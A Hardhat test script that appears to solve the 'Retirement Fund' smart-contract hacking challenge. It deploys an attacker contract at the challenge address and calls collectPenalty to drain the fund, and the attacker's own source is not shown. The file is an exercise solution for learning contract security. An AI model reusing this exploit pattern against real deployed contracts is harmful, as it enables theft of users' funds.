import {ethers} from "hardhat";
import {Contract, Signer} from "ethers";
import {expect} from "chai";

let accounts: Signer[];
let attacker: Signer;
let contract: Contract; // challenge contract
let transferValue = 1;
before(async function () {
    accounts = await ethers.getSigners();
    attacker = accounts[0];
    const factory = await ethers.getContractFactory("RetirementFundChallenge", attacker);
    contract = factory.attach(`0x6f2Ec19108af1C43617DAC5A0E161fC6fd8c753b`);
});

it("solves the challenge", async function () {
    const factory = await ethers.getContractFactory("RetirementFundAttacker", attacker);
    let attackerContract = await factory.deploy(contract.address,{value:transferValue,gasLimit:1e5});
    await contract.collectPenalty({gasLimit:1e5});
});

after(async function () {
    expect(await contract.isComplete()).to.eq(true);
});